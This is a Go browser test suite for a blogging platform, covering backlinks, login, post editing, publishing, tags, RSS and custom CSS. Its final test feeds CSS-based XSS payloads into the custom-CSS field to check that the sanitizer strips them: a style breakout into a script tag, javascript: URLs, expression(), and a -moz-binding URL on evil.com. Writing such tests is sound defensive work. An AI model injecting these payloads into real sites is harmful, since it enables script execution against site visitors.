package tests

import (
	"fmt"
	"strings"
	"testing"
	"time"
)

// TestBacklinksFeature tests the complete backlinks functionality
func TestBacklinksFeature(t *testing.T) {
	setupTestEnvironment(t)
	defer cleanup()

	// Create user1 and their post first
	user1 := createTestUser(t, "alice", "password123")
	slug1 := user1.createPost(t, "My First Post", "This is my first post about Go programming.", true)
	time.Sleep(200 * time.Millisecond) // Wait for async backlink processing

	// Create user2 and their post that links to user1's post
	user2 := createTestUser(t, "bob", "password456")
	linkText := "[Check out this post](/u/alice/" + slug1 + ")"
	slug2 := user2.createPost(t, "Interesting Article", "I found this interesting: "+linkText, true)
	time.Sleep(500 * time.Millisecond) // Wait for async backlink processing

	// Navigate to User 1's post and verify backlink appears
	publicPage := getPublicPage(t)
	publicPage.MustNavigate(testBaseURL + "/u/alice/" + slug1)
	time.Sleep(500 * time.Millisecond)

	// Check for backlinks section
	backlinksSection := publicPage.MustElement(".post-backlinks")
	if backlinksSection == nil {
		t.Fatal("Backlinks section not found")
	}

	// Verify the backlink title appears
	backlinkText := backlinksSection.MustText()
	if !strings.Contains(backlinkText, "Interesting Article") {
		t.Errorf("Expected backlink title 'Interesting Article', got: %s", backlinkText)
	}

	// Verify username appears in backlink
	if !strings.Contains(backlinkText, "bob") {
		t.Errorf("Expected username 'bob' in backlink, got: %s", backlinkText)
	}

	// Verify the backlink is clickable
	backlinkLink := backlinksSection.MustElement("a")
	href := backlinkLink.MustProperty("href").String()
	if !strings.Contains(href, "/u/bob/"+slug2) {
		t.Errorf("Expected backlink to point to /u/bob/%s, got: %s", slug2, href)
	}
}

// TestBacklinksToggle tests the settings toggle for showing/hiding backlinks
func TestBacklinksToggle(t *testing.T) {
	setupTestEnvironment(t)
	defer cleanup()

	// Create two users
	user1 := createTestUser(t, "charlie", "password123")
	user2 := createTestUser(t, "diana", "password456")

	// User 1 creates a post
	slug1 := user1.createPost(t, "Charlie's Post", "Hello world!", true)
	time.Sleep(200 * time.Millisecond)

	// User 2 creates a post linking to User 1's post
	linkText := "[Charlie's post](/u/charlie/" + slug1 + ")"
	user2.createPost(t, "Diana's Post", "Linking to: "+linkText, true)
	time.Sleep(500 * time.Millisecond)

	// Verify backlinks are shown by default
	publicPage := getPublicPage(t)
	publicPage.MustNavigate(testBaseURL + "/u/charlie/" + slug1)
	publicPage.MustWaitLoad()

	// Backlinks should be visible by default
	if !publicPage.MustHas(".post-backlinks") {
		t.Error("Backlinks should be visible by default")
	}

	// User 1 disables backlinks in settings
	user1.navigateToSettings(t)
	checkbox := user1.Page.MustElement("#showBacklinks")
	if checkbox.MustProperty("checked").Bool() {
		checkbox.MustClick()
	}
	// Use a more specific selector to avoid matching the logout button in header
	user1.Page.MustElement(".btn-cozy[type=submit]").MustClick()
	user1.Page.MustWaitLoad()

	// Wait for settings to be saved
	time.Sleep(300 * time.Millisecond)

	// Verify backlinks are now hidden
	publicPage.MustNavigate(testBaseURL + "/u/charlie/" + slug1)
	publicPage.MustWaitLoad()
	time.Sleep(200 * time.Millisecond)

	if publicPage.MustHas(".post-backlinks") {
		t.Error("Backlinks should be hidden after disabling in settings")
	}
}

// TestMultipleBacklinks tests multiple posts linking to the same post
func TestMultipleBacklinks(t *testing.T) {
	setupTestEnvironment(t)
	defer cleanup()

	// Create three users
	user1 := createTestUser(t, "emma", "password123")
	user2 := createTestUser(t, "frank", "password456")
	user3 := createTestUser(t, "grace", "password789")

	// User 1 creates a post
	slug1 := user1.createPost(t, "Popular Post", "This will get many backlinks.", true)
	time.Sleep(200 * time.Millisecond)

	// User 2 and 3 both link to User 1's post
	linkText := "[Emma's post](/u/emma/" + slug1 + ")"
	user2.createPost(t, "Frank's Response", "Responding to: "+linkText, true)
	time.Sleep(300 * time.Millisecond)
	user3.createPost(t, "Grace's Thoughts", "Thoughts on: "+linkText, true)
	time.Sleep(500 * time.Millisecond)

	// Verify both backlinks appear
	publicPage := getPublicPage(t)
	publicPage.MustNavigate(testBaseURL + "/u/emma/" + slug1)
	publicPage.MustWaitLoad()

	backlinksSection := publicPage.MustElement(".post-backlinks")
	backlinkText := backlinksSection.MustText()

	// Check for both titles
	if !strings.Contains(backlinkText, "Frank's Response") {
		t.Error("Expected to find Frank's Response in backlinks")
	}
	if !strings.Contains(backlinkText, "Grace's Thoughts") {
		t.Error("Expected to find Grace's Thoughts in backlinks")
	}
}

// TestAuthenticationFlow tests user signup, signin, and logout
func TestAuthenticationFlow(t *testing.T) {
	setupTestEnvironment(t)
	defer cleanup()

	// Test signup
	user := createTestUser(t, "testuser", "testpass123")
	currentURL := user.Page.MustInfo().URL
	if !strings.Contains(currentURL, "/dashboard") {
		t.Errorf("Expected to be on dashboard after signup, got: %s", currentURL)
	}

	// Test logout - use form action selector to ensure we click the right button
	user.Page.MustElement("form[action='/logout'] button[type=submit]").MustClick()
	time.Sleep(500 * time.Millisecond)
	user.Page.MustWaitLoad()

	// Should redirect to signin page
	currentURL = user.Page.MustInfo().URL
	if !strings.Contains(currentURL, "/signin") {
		t.Errorf("Expected to be redirected to /signin after logout, got: %s", currentURL)
	}

	// Wait a bit before signin test to ensure session is cleared
	time.Sleep(200 * time.Millisecond)

	// Test signin
	signedInUser := signInUser(t, "testuser", "testpass123")
	currentURL = signedInUser.Page.MustInfo().URL
	if !strings.Contains(currentURL, "/dashboard") {
		t.Errorf("Expected to be on dashboard after signin, got: %s", currentURL)
	}
}

// TestPostManagement tests creating, editing, and deleting posts
func TestPostManagement(t *testing.T) {
	setupTestEnvironment(t)
	defer cleanup()

	user := createTestUser(t, "editor", "password123")

	// Create a post
	slug := user.createPost(t, "Test Post", "This is a test post body.", true)

	// Verify slug was created
	if slug == "" {
		t.Fatal("Post creation failed - no slug returned")
	}

	// Wait for JavaScript to load on edit page
	time.Sleep(500 * time.Millisecond)

	// Edit the post - use JavaScript to update the title field
	user.Page.MustEval(`() => {
		const titleField = document.getElementById('title');
		titleField.value = 'Updated Test Post';
		document.getElementById('body').value = 'This is the updated body.';
	}`)
	user.Page.MustElement("#submitButton").MustClick()
	user.Page.MustWaitLoad()

	// Wait for page to fully load
	time.Sleep(300 * time.Millisecond)

	// Verify changes were saved
	updatedTitle := user.Page.MustElement("#title").MustProperty("value").String()
	if updatedTitle != "Updated Test Post" {
		t.Errorf("Expected title 'Updated Test Post', got: %s", updatedTitle)
	}

	// Delete the post - handle the confirmation dialog
	wait, handle := user.Page.MustHandleDialog()
	go func() {
		wait()
		handle(true, "")
	}()
	user.Page.MustElement("form[action*='/delete'] input[type=submit]").MustClick()
	user.Page.MustWaitLoad()

	// Should redirect to dashboard
	currentURL := user.Page.MustInfo().URL
	if !strings.Contains(currentURL, "/dashboard") {
		t.Errorf("Expected to be redirected to dashboard after delete, got: %s", currentURL)
	}
}

// TestStalenessCheckEndpoint tests the /check endpoint for staleness detection
func TestStalenessCheckEndpoint(t *testing.T) {
	setupTestEnvironment(t)
	defer cleanup()

	user := createTestUser(t, "staleuser", "password123")

	// Create a post
	slug := user.createPost(t, "Staleness Test Post", "Initial content.", true)
	if slug == "" {
		t.Fatal("Post creation failed")
	}

	// Get the post ID from the current URL
	currentURL := user.Page.MustInfo().URL
	// URL is like /dashboard/post/1
	parts := strings.Split(currentURL, "/")
	postID := parts[len(parts)-1]

	// Verify the check endpoint returns JSON with updatedAt
	checkURL := testBaseURL + "/dashboard/post/" + postID + "/check"

	// Use the same browser session to maintain authentication
	resp := user.Page.MustEval(`async () => {
		const response = await fetch('` + checkURL + `', {
			method: 'GET',
			headers: { 'Accept': 'application/json' }
		});
		if (!response.ok) return { error: response.status };
		return await response.json();
	}`)

	// Check that we got a valid updatedAt timestamp
	respMap := resp.Map()
	if _, hasError := respMap["error"]; hasError {
		t.Errorf("Check endpoint returned error: %v", respMap["error"])
	}
	if _, hasUpdatedAt := respMap["updatedAt"]; !hasUpdatedAt {
		t.Error("Check endpoint should return updatedAt field")
	}

	updatedAt := respMap["updatedAt"].Int()
	if updatedAt <= 0 {
		t.Errorf("updatedAt should be a positive timestamp, got: %d", updatedAt)
	}
}

// TestStalenessNoFalsePositiveOnSave tests that saving via Ctrl+S doesn't trigger false staleness warnings
func TestStalenessNoFalsePositiveOnSave(t *testing.T) {
	setupTestEnvironment(t)
	defer cleanup()

	user := createTestUser(t, "saveuser", "password123")

	// Create a post
	slug := user.createPost(t, "Save Test Post", "Initial content.", true)
	if slug == "" {
		t.Fatal("Post creation failed")
	}

	// Wait for page to fully load
	time.Sleep(500 * time.Millisecond)

	// Simulate the scenario that was causing false positives:
	// 1. Trigger a save (like Ctrl+S would)
	// 2. Simultaneously trigger a staleness check (like focus event would)
	// 3. Verify no staleness banner appears

	// Use JavaScript to simulate the race condition scenario
	result := user.Page.MustEval(`async () => {
		// Get references to the functions/variables we need
		const form = document.querySelector('form#postEditForm');
		if (!form) return { error: 'Form not found' };

		// Trigger save via form submission (same as Ctrl+S does)
		const formData = new FormData(form);
		
		// Start both requests nearly simultaneously
		const savePromise = fetch(form.action, {
			method: 'POST',
			body: formData,
		});

		// Small delay to let save start, then check for staleness
		await new Promise(r => setTimeout(r, 50));
		
		// Wait for save to complete
		const saveResponse = await savePromise;
		
		// Wait a bit more for any staleness check to complete
		await new Promise(r => setTimeout(r, 200));
		
		// Check if staleness banner appeared (it shouldn't!)
		const staleBanner = document.getElementById('staleBanner');
		
		return {
			saveOk: saveResponse.ok,
			staleBannerVisible: staleBanner !== null
		};
	}`)

	resultMap := result.Map()

	if !resultMap["saveOk"].Bool() {
		t.Error("Save request should succeed")
	}

	if resultMap["staleBannerVisible"].Bool() {
		t.Error("Staleness banner should NOT appear after a normal save - this indicates a race condition bug")
	}
}

// TestPublishUnpublishToggle tests the publish/unpublish functionality
func TestPublishUnpublishToggle(t *testing.T) {
	setupTestEnvironment(t)
	defer cleanup()

	user := createTestUser(t, "publisher", "password123")

	// Create an unpublished post
	user.Page.MustNavigate(testBaseURL + "/dashboard/post/new")
	user.Page.MustWaitLoad()
	time.Sleep(500 * time.Millisecond) // Wait for JS to load

	user.Page.MustElement("#title").MustInput("Draft Post")
	user.Page.MustEval(`() => { document.getElementById('body').value = "This is a draft." }`)
	// Don't check the published checkbox
	user.Page.MustElement("#submitButton").MustClick()
	user.Page.MustWaitLoad()

	slug := user.Page.MustElement("#slug").MustProperty("value").String()

	// Try to access as public (should fail)
	publicPage := getPublicPage(t)
	publicPage.MustNavigate(testBaseURL + "/u/publisher/" + slug)
	publicPage.MustWaitLoad()

	// Should show 404 or "Post not found"
	pageText := publicPage.MustElement("body").MustText()
	if !strings.Contains(pageText, "not found") && !strings.Contains(pageText, "404") {
		t.Error("Unpublished post should not be accessible publicly")
	}

	// Publish the post
	user.Page.MustElement("#published").MustClick()
	user.Page.MustElement("#submitButton").MustClick()
	user.Page.MustWaitLoad()

	time.Sleep(100 * time.Millisecond)

	// Now it should be accessible
	publicPage.MustNavigate(testBaseURL + "/u/publisher/" + slug)
	publicPage.MustWaitLoad()
	time.Sleep(100 * time.Millisecond)

	// Find the post title in the main content area (not the site header)
	pageTitle := publicPage.MustElement("article h1, .post-content h1, main h1").MustText()
	if pageTitle != "Draft Post" {
		// If we didn't find the specific title, check body for the text
		bodyText := publicPage.MustElement("body").MustText()
		if !strings.Contains(bodyText, "Draft Post") {
			t.Errorf("Expected to see published post title 'Draft Post', got h1: %s", pageTitle)
		}
	}
}

// TestSettingsUpdate tests updating user settings
func TestSettingsUpdate(t *testing.T) {
	setupTestEnvironment(t)
	defer cleanup()

	user := createTestUser(t, "settings_user", "password123")

	// Navigate to settings
	user.navigateToSettings(t)

	// Update blog title
	blogTitleField := user.Page.MustElement("#blogTitle")
	blogTitleField.MustSelectAllText()
	blogTitleField.MustInput("My Awesome Blog")

	// Update header markdown
	headerField := user.Page.MustElement("#headerMarkdown")
	headerField.MustSelectAllText()
	headerField.MustInput("[Home](/u/settings_user) | [About](/u/settings_user/about)")

	// Save settings - use specific selector
	user.Page.MustElement(".btn-cozy[type=submit]").MustClick()
	user.Page.MustWaitLoad()

	// Verify settings were saved
	blogTitle := user.Page.MustElement("#blogTitle").MustProperty("value").String()
	if blogTitle != "My Awesome Blog" {
		t.Errorf("Expected blog title 'My Awesome Blog', got: %s", blogTitle)
	}
}

// TestTagFiltering tests the tag filtering functionality
func TestTagFiltering(t *testing.T) {
	setupTestEnvironment(t)
	defer cleanup()

	user := createTestUser(t, "tagger", "password123")

	// Create posts with different tags
	user.Page.MustNavigate(testBaseURL + "/dashboard/post/new")
	user.Page.MustWaitLoad()
	time.Sleep(500 * time.Millisecond) // Wait for JS to load
	user.Page.MustElement("#title").MustInput("Go Post")
	user.Page.MustEval(`() => { document.getElementById('body').value = "About Go programming" }`)
	user.Page.MustElement("#tags").MustInput("go, programming")
	user.Page.MustElement("#published").MustClick()
	user.Page.MustElement("#submitButton").MustClick()
	user.Page.MustWaitLoad()

	user.Page.MustNavigate(testBaseURL + "/dashboard/post/new")
	user.Page.MustWaitLoad()
	time.Sleep(500 * time.Millisecond) // Wait for JS to load
	user.Page.MustElement("#title").MustInput("Rust Post")
	user.Page.MustEval(`() => { document.getElementById('body').value = "About Rust programming" }`)
	user.Page.MustElement("#tags").MustInput("rust, programming")
	user.Page.MustElement("#published").MustClick()
	user.Page.MustElement("#submitButton").MustClick()
	user.Page.MustWaitLoad()

	time.Sleep(200 * time.Millisecond)

	// View tag page for "go"
	publicPage := getPublicPage(t)
	publicPage.MustNavigate(testBaseURL + "/u/tagger/tag/go")
	publicPage.MustWaitLoad()

	pageText := publicPage.MustElement("body").MustText()
	if !strings.Contains(pageText, "Go Post") {
		t.Error("Expected to find 'Go Post' on go tag page")
	}
	if strings.Contains(pageText, "Rust Post") {
		t.Error("Should not find 'Rust Post' on go tag page")
	}
}

// TestRSSFeed tests that the RSS feed is accessible
func TestRSSFeed(t *testing.T) {
	setupTestEnvironment(t)
	defer cleanup()

	user := createTestUser(t, "rssuser", "password123")

	// Create a published post
	user.createPost(t, "RSS Test Post", "This should appear in the feed.", true)
	time.Sleep(200 * time.Millisecond)

	// Access RSS feed
	publicPage := getPublicPage(t)
	publicPage.MustNavigate(testBaseURL + "/u/rssuser/feed.xml")
	publicPage.MustWaitLoad()

	// Check that it contains RSS content
	pageText := publicPage.MustElement("body").MustText()
	if !strings.Contains(pageText, "<?xml") || !strings.Contains(pageText, "<rss") {
		t.Error("RSS feed should contain valid XML")
	}
	if !strings.Contains(pageText, "RSS Test Post") {
		t.Error("RSS feed should contain the post title")
	}
}

// TestArchivePage tests the archive page functionality
func TestArchivePage(t *testing.T) {
	setupTestEnvironment(t)
	defer cleanup()

	user := createTestUser(t, "archiver", "password123")

	// Create multiple posts
	user.createPost(t, "Post 1", "First post content", true)
	user.createPost(t, "Post 2", "Second post content", true)
	user.createPost(t, "Post 3", "Third post content", true)
	time.Sleep(300 * time.Millisecond)

	// View archive page
	publicPage := getPublicPage(t)
	publicPage.MustNavigate(testBaseURL + "/u/archiver/archive")
	publicPage.MustWaitLoad()

	pageText := publicPage.MustElement("body").MustText()

	// All posts should appear in archive
	if !strings.Contains(pageText, "Post 1") {
		t.Error("Archive should contain Post 1")
	}
	if !strings.Contains(pageText, "Post 2") {
		t.Error("Archive should contain Post 2")
	}
	if !strings.Contains(pageText, "Post 3") {
		t.Error("Archive should contain Post 3")
	}

	// Should be grouped by year
	currentYear := time.Now().Year()
	yearStr := fmt.Sprintf("%d", currentYear)
	if !strings.Contains(pageText, yearStr) {
		t.Errorf("Archive should contain current year %d", currentYear)
	}
}

// TestCustomCSS tests the custom CSS feature
func TestCustomCSS(t *testing.T) {
	setupTestEnvironment(t)
	defer cleanup()

	user := createTestUser(t, "styler", "password123")

	// Create a post so we have a public page to check
	user.createPost(t, "Styled Post", "This post should have custom styles.", true)
	time.Sleep(200 * time.Millisecond)

	// Navigate to settings and add custom CSS
	user.navigateToSettings(t)
	time.Sleep(300 * time.Millisecond) // Wait for page JS to initialize

	// Click on the Appearance tab using JavaScript to avoid interactability issues
	user.Page.MustEval(`() => document.querySelector('.tab-btn[data-tab="appearance"]').click()`)
	time.Sleep(200 * time.Millisecond)

	// Add custom CSS using JavaScript
	user.Page.MustEval(`() => { document.getElementById('customCSS').value = 'body { background-color: #f0f0f0; } .test-class { color: red; }' }`)

	// Save settings by clicking the submit button via JavaScript
	user.Page.MustEval(`() => document.querySelector('button.btn-cozy[type="submit"]').click()`)
	user.Page.MustWaitLoad()
	time.Sleep(200 * time.Millisecond)

	// Verify CSS was saved by checking the field still has the value
	user.Page.MustEval(`() => document.querySelector('.tab-btn[data-tab="appearance"]').click()`)
	time.Sleep(200 * time.Millisecond)
	savedCSS := user.Page.MustEval(`() => document.getElementById('customCSS').value`).String()
	if !strings.Contains(savedCSS, "background-color: #f0f0f0") {
		t.Errorf("Expected custom CSS to be saved, got: %s", savedCSS)
	}

	// Check that CSS appears on the public page
	publicPage := getPublicPage(t)
	publicPage.MustNavigate(testBaseURL + "/u/styler/styled-post")
	publicPage.MustWaitLoad()

	// Get the page HTML and check for the custom CSS in a style tag
	pageHTML := publicPage.MustHTML()
	if !strings.Contains(pageHTML, "background-color: #f0f0f0") {
		t.Error("Custom CSS should appear in the public page HTML")
	}
	if !strings.Contains(pageHTML, ".test-class { color: red; }") {
		t.Error("Custom CSS class should appear in the public page HTML")
	}
}

// TestCustomCSSSanitization tests that dangerous CSS content is sanitized
func TestCustomCSSSanitization(t *testing.T) {
	setupTestEnvironment(t)
	defer cleanup()

	user := createTestUser(t, "hacker", "password123")

	// Create a post
	user.createPost(t, "Hacker Post", "Testing sanitization.", true)
	time.Sleep(200 * time.Millisecond)

	// Navigate to settings and try to add malicious CSS
	user.navigateToSettings(t)
	time.Sleep(300 * time.Millisecond)

	// Click on the Appearance tab using JavaScript to avoid interactability issues
	user.Page.MustEval(`() => document.querySelector('.tab-btn[data-tab="appearance"]').click()`)
	time.Sleep(200 * time.Millisecond)

	// Try various XSS attempts via CSS
	maliciousCSS := `body { color: black; }
</style><script>alert('xss')</script><style>
body { background: url(javascript:alert('xss')); }
div { -moz-binding: url('http://evil.com/xss.xml'); }
span { behavior: url('script.htc'); }
p { background: expression(alert('xss')); }`

	user.Page.MustEval(fmt.Sprintf(`() => { document.getElementById('customCSS').value = %q }`, maliciousCSS))
	user.Page.MustEval(`() => document.querySelector('button.btn-cozy[type="submit"]').click()`)
	user.Page.MustWaitLoad()
	time.Sleep(200 * time.Millisecond)

	// Check the public page - malicious content should be stripped
	publicPage := getPublicPage(t)
	publicPage.MustNavigate(testBaseURL + "/u/hacker/hacker-post")
	publicPage.MustWaitLoad()

	pageHTML := publicPage.MustHTML()

	// These dangerous patterns should NOT appear
	if strings.Contains(pageHTML, "</style><script>") {
		t.Error("Style tag breakout should be sanitized")
	}
	if strings.Contains(pageHTML, "javascript:") {
		t.Error("JavaScript URLs should be sanitized")
	}
	if strings.Contains(pageHTML, "-moz-binding:") {
		t.Error("-moz-binding should be sanitized")
	}
	if strings.Contains(pageHTML, "behavior:") {
		t.Error("behavior property should be sanitized")
	}
	if strings.Contains(pageHTML, "expression(") {
		t.Error("expression() should be sanitized")
	}

	// But legitimate CSS should still work
	if !strings.Contains(pageHTML, "color: black") {
		t.Error("Legitimate CSS should be preserved")
	}
}
